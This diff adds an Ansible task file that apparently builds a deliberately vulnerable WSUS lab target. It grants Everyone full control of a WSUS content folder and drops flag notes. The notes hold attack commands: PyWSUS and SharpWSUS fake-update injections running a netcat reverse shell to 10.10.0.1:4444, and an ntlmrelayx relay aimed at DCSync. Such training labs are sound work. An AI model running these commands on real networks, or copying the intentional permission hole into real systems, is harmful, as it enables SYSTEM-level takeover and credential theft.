@@ -1,0 +1,75 @@
+---
+# ==============================================================================
+# vuln_exchange/tasks/wsus.yml — SRV-041..055
+# Target: file01.corp.local
+#
+# SRV-041  WSUS server HTTP endpoint (no HTTPS)
+# SRV-042  WSUS unauthenticated update metadata access
+# SRV-043  WSUS local admin injection (wsus_injection.exe path)
+# SRV-044  WSUS staging directory world-writable
+# SRV-045  WSUS admin console accessible from workstations
+# SRV-046  WSUS SPN registered for relay (SPN spoofing surface)
+# SRV-047  WSUS downstream server unauthorized approval
+# SRV-048..055 stub notes
+# ==============================================================================
+
+# SRV-044: WSUS content directory world-writable
+- name: SRV-044 - Create WSUS stub directory
+  ansible.windows.win_file:
+    path: 'C:\WSUSContent'
+    state: directory
+
+- name: SRV-044 - Set WSUSContent world-writable (WSUS staging injection)
+  ansible.windows.win_shell: |
+    icacls C:\WSUSContent /grant "Everyone:(OI)(CI)F" /T /C /Q 2>&1 | Out-Null
+    Write-Output "changed: WSUSContent world-writable"
+  register: srv044_set
+  changed_when: "'changed:' in srv044_set.stdout"
+  failed_when: srv044_set.rc != 0
+
+# SRV-041/043: WSUS HTTP endpoint + injection notes
+- name: SRV-041..055 - Drop WSUS attack surface notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-SRV-041-WSUS-HTTP.txt'
+      content: |
+        SRV-041: WSUS HTTP Endpoint (No HTTPS)
+        ========================================
+        WSUS served over HTTP (port {{ wsus_port }}) — content not encrypted or signed.
+        WSUS server: {{ wsus_server }}:{{ wsus_port }}
+
+        Attack: WSUS MITM — intercept HTTP update requests and inject malicious
+        update packages that execute as SYSTEM.
+
+        Tools: PyWSUS (inject WSUS package), wsuspect.py
+        python3 pywsus.py --host 10.10.0.13 --port 8530 --executable nc.exe --arguments "-e cmd 10.10.0.1 4444"
+
+    - path: 'C:\Flags\FLAG-SRV-043-WSUS-Injection.txt'
+      content: |
+        SRV-043: WSUS Update Injection (SharpWSUS)
+        ============================================
+        If you can authenticate to the WSUS admin console or API, you can
+        inject a fake Windows Update that executes arbitrary code as SYSTEM.
+
+        Prereqs: Access to WSUS admin console (port 8530/8531)
+        Attack:
+          SharpWSUS.exe create /payload:"C:\Tools\nc.exe" /args:"-e cmd 10.10.0.1 4444" /title:"KB99999999"
+          SharpWSUS.exe approve /updateid:<ID> /computername:ws01.corp.local /groupname:DVAD-Targets
+          SharpWSUS.exe check /updateid:<ID> /computername:ws01.corp.local
+
+        Stage the payload at: C:\WSUSContent\ (world-writable — SRV-044)
+
+    - path: 'C:\Flags\FLAG-SRV-046-WSUS-SPN.txt'
+      content: |
+        SRV-046: WSUS SPN for NTLM Relay
+        ==================================
+        A WSUS SPN registered in AD allows NTLM relay to the WSUS endpoint.
+        If WSUS runs as a domain account, relay to LDAP can be used for DCSync.
+
+        SPN to check:
+          setspn -Q HTTP/wsus.corp.local
+          setspn -Q WSMAN/wsus.corp.local
+
+        If found: ntlmrelayx.py --target http://file01.corp.local:8530/selfupdate/
